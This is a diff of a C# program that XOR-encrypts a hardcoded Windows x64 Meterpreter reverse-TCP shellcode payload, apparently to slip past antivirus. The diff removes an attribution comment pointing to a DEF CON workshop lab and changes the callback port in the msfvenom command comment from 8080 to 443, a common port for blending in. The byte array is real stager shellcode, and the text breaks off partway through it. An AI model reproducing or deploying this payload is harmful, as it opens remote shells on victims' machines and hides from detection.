@@ -1,4 +1,3 @@
-// XOR Encryptor courtesy of Mauricio Velazco available here https://raw.githubusercontent.com/mvelazc0/defcon27_csharp_workshop/master/Labs/lab4/1.cs
 using System;
 using System.IO;
 using System.Text;
@@ -22,10 +21,10 @@ public class Program
 
     static void Main()
     {
-        // The string value for the key is used to encrypt the shellcode
+        // The string value for the key to use
 		string key = "TAMSIKUNOSF";
 		
-		// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=8080 EXITFUNC=thread -f csharp
+		// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=443 EXITFUNC=thread -f csharp
         byte[] shellcode = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
         0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
         0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,
